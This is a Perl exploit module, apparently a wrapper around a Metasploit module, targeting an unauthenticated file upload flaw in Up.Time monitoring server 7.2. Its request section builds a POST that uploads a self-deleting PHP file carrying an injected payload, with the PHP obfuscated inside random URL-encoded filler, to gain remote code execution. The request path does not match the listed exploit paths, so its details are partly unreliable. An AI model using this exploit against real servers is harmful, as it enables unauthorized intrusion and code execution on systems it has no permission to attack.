package MSFExploits::Exploits::UPTIME::MSF::UptimeFileUpload_1;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::UPTIME);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "UptimeFileUpload_1";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits an arbitrary file upload vulnerability found within the Up.Time

          monitoring server 7.2 and below. A malicious entity can upload a PHP file into the

          webroot without authentication, leading to arbitrary code execution.



          Although the vendor fixed Up.Time to prevent this vulnerability, it was not properly

          mitigated. To exploit against a newer version of Up.Time (such as 7.4), please use

          exploits/multi/http/uptime_file_upload_2.

      ",
  METHOD      => "",
  MSF_MODULE  => "uptime_file_upload_1",
  OSVDB       => 100423,
  PATH        => "",
  PATHS       => ["wizards/post2file.php", "wizards,\@payload_name", ""],
  PAYLOAD     => "?",
  REFERENCES  => [
                   "http://www.security-assessment.com/files/documents/advisory/Up.Time%207.2%20-%20Arbitrary%20File%20Upload.pdf",
                 ],
  TITLE       => "Idera Up.Time Monitoring Station 7.0 post2file.php Arbitrary File Upload",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The full URI path to the Up.Time instance",
  VALUE => "/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'admin/file_manager.php/login.php',
      PAYLOAD      => 'filename=4zBgVSV/DnGZRPy9v/RYqPg/0NRXwFY/dDriB/9UXq7ri/2hZVQZwur/sMsage/G6doQ.php&file_contents=A%7cP%60yGIH%257%28%3c%3eQ%5dr%7dC%2b%3aZM%28%3a%7de%26ytPjC1%60L%5eKrt6%28%3bSvj%7dKod_Z%7cVV%3cfz3Af3l\luG%2c%21EU%3f%3aIZ%22%28Lv~%60z1D%7d_%3fS2%2b%3e0DtIikc\%5eb%3b%3bHU%28-vzb%25e%28%3c%25j0%7b%27vL%27G%60GQL%3aW1g%3aBY/Z~%21%27%3c%3fphp%20unlink%28__FILE__%29%3b__PAYLOAD__%20%3f%3e%7dO\\PX%5d%3bDy6q%3cBbNmR%3ep3H%27%7b.n%29%29f%7b%2a%5dpPd/oIE47Rqu%3a53GY%5e%5eWz%7dvXH%27_%270m1%21%26%29\kP-v~qYF%40%27%27%3f92Ejr%3fT4%28~%3e8iy%2aXR%3cH%5d%21%5bSG%26%22',
      TEXT   => 'Sending Exploit #2 Request : [POST] /admin/file_manager.php/login.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
